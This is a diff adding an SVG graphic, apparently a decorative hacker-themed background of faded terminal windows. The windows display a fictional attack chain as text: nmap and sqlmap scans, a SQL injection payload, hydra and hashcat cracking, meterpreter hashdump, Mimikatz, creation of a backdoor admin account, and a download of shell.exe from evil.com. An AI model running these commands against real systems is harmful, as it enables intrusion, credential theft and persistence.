@@ -1,0 +1,181 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" width="1280" height="720">
+  <defs>
+    <linearGradient id="bg" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#020810"/>
+      <stop offset="100%" stop-color="#0a1628"/>
+    </linearGradient>
+    <filter id="glow">
+      <feGaussianBlur stdDeviation="2" result="b"/>
+      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
+    <pattern id="scan" width="4" height="4" patternUnits="userSpaceOnUse">
+      <line x1="0" y1="0" x2="4" y2="0" stroke="#000" stroke-width="1" opacity="0.08"/>
+    </pattern>
+    <radialGradient id="vig" cx="50%" cy="50%" r="70%">
+      <stop offset="0%" stop-color="#000" stop-opacity="0"/>
+      <stop offset="100%" stop-color="#000" stop-opacity="0.45"/>
+    </radialGradient>
+  </defs>
+
+  <rect width="1280" height="720" fill="url(#bg)"/>
+
+  <!-- TERMINAL 1: Top-left — Recon -->
+  <g transform="translate(25,18)" opacity="0.35">
+    <rect width="380" height="220" rx="6" fill="#0a0d14" stroke="#1a3a1a" stroke-width="1"/>
+    <rect width="380" height="24" rx="6" fill="#141c24"/>
+    <rect y="12" width="380" height="12" fill="#141c24"/>
+    <circle cx="15" cy="12" r="4" fill="#ff5555"/>
+    <circle cx="30" cy="12" r="4" fill="#ffaa00"/>
+    <circle cx="45" cy="12" r="4" fill="#00ff41"/>
+    <text x="190" y="16" font-family="'Courier New',monospace" font-size="10" fill="#4a6a4a" text-anchor="middle">recon@kali:~/targets</text>
+    <g font-family="'Courier New',monospace" font-size="11">
+      <text x="10" y="46" fill="#00ff41">$ nmap -sV -sC -O 10.0.0.0/24</text>
+      <text x="10" y="64" fill="#708070">Discovered open port 443/tcp</text>
+      <text x="10" y="80" fill="#708070">Discovered open port 8080/tcp</text>
+      <text x="10" y="96" fill="#708070">Discovered open port 3306/tcp</text>
+      <text x="10" y="112" fill="#ffaa00">SERVICE: Apache/2.4.49 (CVE-2021-41773)</text>
+      <text x="10" y="134" fill="#00ff41">$ sqlmap -u "http://10.0.0.5/login?id=1"</text>
+      <text x="10" y="152" fill="#ff5555">[CRITICAL] target vulnerable to SQLi</text>
+      <text x="10" y="168" fill="#708070">Type: UNION query</text>
+      <text x="10" y="184" fill="#708070">Payload: id=1 UNION SELECT 1,2,3--</text>
+      <text x="10" y="206" fill="#00ff41">$ gobuster dir -u http://10.0.0.5</text>
+    </g>
+  </g>
+
+  <!-- TERMINAL 2: Top-right — Credentials -->
+  <g transform="translate(880,12)" opacity="0.35">
+    <rect width="375" height="210" rx="6" fill="#0a0d14" stroke="#3a1a1a" stroke-width="1"/>
+    <rect width="375" height="24" rx="6" fill="#141c24"/>
+    <rect y="12" width="375" height="12" fill="#141c24"/>
+    <circle cx="15" cy="12" r="4" fill="#ff5555"/>
+    <circle cx="30" cy="12" r="4" fill="#ffaa00"/>
+    <circle cx="45" cy="12" r="4" fill="#00ff41"/>
+    <text x="187" y="16" font-family="'Courier New',monospace" font-size="10" fill="#6a4a4a" text-anchor="middle">attacker@c2:~/creds</text>
+    <g font-family="'Courier New',monospace" font-size="11">
+      <text x="10" y="46" fill="#00ff41">$ hydra -l admin -P rockyou.txt ssh://10.0.0.5</text>
+      <text x="10" y="64" fill="#708070">[DATA] attacking ssh://10.0.0.5:22</text>
+      <text x="10" y="80" fill="#ffaa00">[22][ssh] login: admin  pass: Welcome1!</text>
+      <text x="10" y="102" fill="#00ff41">$ hashcat -m 1000 ntlm.txt wordlist.txt</text>
+      <text x="10" y="120" fill="#708070">aad3b435b51404ee:5f4dcc3b5aa765d6</text>
+      <text x="10" y="136" fill="#ff5555">Cracked: 847/1024 (82.7%) recovered</text>
+      <text x="10" y="158" fill="#00ff41">$ python3 token_stealer.py --oauth</text>
+      <text x="10" y="176" fill="#708070">[+] Captured Bearer token: eyJhbGci...</text>
+      <text x="10" y="192" fill="#ff5555">[+] Token scope: admin read write delete</text>
+    </g>
+  </g>
+
+  <!-- TERMINAL 3: Bottom-left — Post-exploitation -->
+  <g transform="translate(25,425)" opacity="0.35">
+    <rect width="380" height="275" rx="6" fill="#0a0d14" stroke="#1a1a3a" stroke-width="1"/>
+    <rect width="380" height="24" rx="6" fill="#141c24"/>
+    <rect y="12" width="380" height="12" fill="#141c24"/>
+    <circle cx="15" cy="12" r="4" fill="#ff5555"/>
+    <circle cx="30" cy="12" r="4" fill="#ffaa00"/>
+    <circle cx="45" cy="12" r="4" fill="#00ff41"/>
+    <text x="190" y="16" font-family="'Courier New',monospace" font-size="10" fill="#4a4a6a" text-anchor="middle">meterpreter > (10.0.0.5)</text>
+    <g font-family="'Courier New',monospace" font-size="11">
+      <text x="10" y="46" fill="#ff3355">meterpreter > getuid</text>
+      <text x="10" y="64" fill="#708070">Server username: NT AUTHORITY\SYSTEM</text>
+      <text x="10" y="86" fill="#ff3355">meterpreter > hashdump</text>
+      <text x="10" y="104" fill="#708070">Admin:500:aad3b435:5f4dcc3b5aa7...</text>
+      <text x="10" y="120" fill="#708070">svc_deploy:1001:aad3b435:e99a18...</text>
+      <text x="10" y="142" fill="#ff3355">meterpreter > run post/multi/gather/env</text>
+      <text x="10" y="160" fill="#ffaa00">DB_PASSWORD=Pr0d_S3cret!@#</text>
+      <text x="10" y="176" fill="#ffaa00">AWS_SECRET_KEY=AKIA3EXAMPLE...</text>
+      <text x="10" y="192" fill="#ffaa00">JWT_SECRET=mysupersecretkey</text>
+      <text x="10" y="214" fill="#ff3355">meterpreter > portfwd add -l 4444 -p 3389</text>
+      <text x="10" y="232" fill="#708070">[+] Pivot: 10.0.0.5 → 10.0.0.20:3389</text>
+      <text x="10" y="254" fill="#ff3355">meterpreter > download /db/customers.sql</text>
+      <text x="10" y="270" fill="#ff5555">[+] Exfiltrating: 247MB (1.2M records)</text>
+    </g>
+  </g>
+
+  <!-- TERMINAL 4: Bottom-right — Lateral Movement -->
+  <g transform="translate(870,435)" opacity="0.35">
+    <rect width="385" height="265" rx="6" fill="#0a0d14" stroke="#3a2a1a" stroke-width="1"/>
+    <rect width="385" height="24" rx="6" fill="#141c24"/>
+    <rect y="12" width="385" height="12" fill="#141c24"/>
+    <circle cx="15" cy="12" r="4" fill="#ff5555"/>
+    <circle cx="30" cy="12" r="4" fill="#ffaa00"/>
+    <circle cx="45" cy="12" r="4" fill="#00ff41"/>
+    <text x="192" y="16" font-family="'Courier New',monospace" font-size="10" fill="#6a5a3a" text-anchor="middle">C:\Windows\system32</text>
+    <g font-family="'Courier New',monospace" font-size="11">
+      <text x="10" y="46" fill="#8888cc">PS C:\> Invoke-Mimikatz -Command</text>
+      <text x="60" y="62" fill="#b8b8d8">"sekurlsa::logonpasswords"</text>
+      <text x="10" y="82" fill="#ffaa00">  User: svc_admin</text>
+      <text x="10" y="98" fill="#ffaa00">  NTLM: 2b576acbe6bcfda7294d6bd1...</text>
+      <text x="10" y="120" fill="#8888cc">PS C:\> net user backdoor P@ss123! /add</text>
+      <text x="10" y="138" fill="#708070">The command completed successfully.</text>
+      <text x="10" y="160" fill="#8888cc">PS C:\> net localgroup Administrators</text>
+      <text x="60" y="176" fill="#b8b8d8">backdoor /add</text>
+      <text x="10" y="194" fill="#708070">The command completed successfully.</text>
+      <text x="10" y="216" fill="#8888cc">PS C:\> Invoke-WebRequest -Uri</text>
+      <text x="60" y="232" fill="#b8b8d8">"http://evil.com/shell.exe"</text>
+      <text x="10" y="252" fill="#ff5555">[+] Persistence established.</text>
+      <text x="10" y="268" fill="#ff5555">[+] C2 beacon active. Interval: 60s</text>
+    </g>
+  </g>
+
+  <!-- CROOKED LINE — moderate visibility, the connecting thread -->
+  <g filter="url(#glow)" opacity="0.25">
+    <path d="M 640,0 C 640,25 520,45 500,70 C 460,130 710,145 730,185
+             C 760,240 430,260 450,310 C 480,370 740,360 720,410
+             C 690,475 460,465 480,515 C 510,575 720,565 690,615
+             C 660,665 590,690 610,720"
+          stroke="#ff003c" stroke-width="2" fill="none" stroke-linecap="round"/>
+  </g>
+  <!-- Tactic dots along the path -->
+  <g filter="url(#glow)" opacity="0.35">
+    <circle cx="500" cy="70" r="4" fill="#00ff41"/>
+    <circle cx="730" cy="185" r="4" fill="#ff5555"/>
+    <circle cx="450" cy="310" r="4" fill="#ff5555"/>
+    <circle cx="720" cy="410" r="4" fill="#ff003c"/>
+    <circle cx="480" cy="515" r="4" fill="#ff003c"/>
+    <circle cx="690" cy="615" r="4" fill="#ff003c"/>
+  </g>
+  <!-- Tactic labels -->
+  <g font-family="'Courier New',monospace" font-size="9" opacity="0.2">
+    <text x="512" y="67" fill="#00ff41">RECON</text>
+    <text x="742" y="182" fill="#ff5555">EXEC</text>
+    <text x="415" y="305" fill="#ff5555" text-anchor="end">PERSIST</text>
+    <text x="732" y="407" fill="#ff003c">ESCALATE</text>
+    <text x="445" y="510" fill="#ff003c" text-anchor="end">LATERAL</text>
+    <text x="702" y="612" fill="#ff003c">EXFIL</text>
+  </g>
+
+  <!-- ALERT LOG LINES — floating between terminals -->
+  <g font-family="'Courier New',monospace" font-size="9" opacity="0.18">
+    <text x="435" y="268" fill="#ff5555">[ALERT] T1078 — Valid Account from unusual IP</text>
+    <text x="435" y="310" fill="#ffaa00">[WARN]  T1195 — Package hash mismatch detected</text>
+    <text x="435" y="352" fill="#ffaa00">[WARN]  T1110 — 847 failed logins in 60s</text>
+    <text x="435" y="394" fill="#ff5555">[ALERT] T1213 — Bulk data access: 1.2M records</text>
+  </g>
+
+  <!-- CIRCUIT TRACES — connecting wiring -->
+  <g stroke="#0e3050" stroke-width="1" opacity="0.3" fill="none">
+    <path d="M 405,130 H 500 L 520,150 H 870"/>
+    <path d="M 405,580 H 500 L 520,560 H 600"/>
+    <path d="M 870,520 H 780 L 760,500 H 650"/>
+    <circle cx="870" cy="150" r="2.5" fill="#0e3050"/>
+    <circle cx="600" cy="560" r="2.5" fill="#0e3050"/>
+    <circle cx="650" cy="500" r="2.5" fill="#0e3050"/>
+  </g>
+
+  <!-- GLITCH BARS -->
+  <g opacity="0.06">
+    <rect x="0" y="242" width="1280" height="2" fill="#ff003c"/>
+    <rect x="0" y="418" width="1280" height="1" fill="#00ff41"/>
+    <rect x="0" y="580" width="1280" height="2" fill="#ff003c"/>
+  </g>
+
+  <!-- HUD CORNERS -->
+  <g stroke="#00ff41" stroke-width="1.5" fill="none" opacity="0.25">
+    <path d="M 12,12 L 12,50 M 12,12 L 50,12"/>
+    <path d="M 1268,12 L 1268,50 M 1268,12 L 1230,12"/>
+    <path d="M 12,708 L 12,670 M 12,708 L 50,708"/>
+    <path d="M 1268,708 L 1268,670 M 1268,708 L 1230,708"/>
+  </g>
+
+  <rect width="1280" height="720" fill="url(#scan)"/>
+  <rect width="1280" height="720" fill="url(#vig)"/>
+</svg>
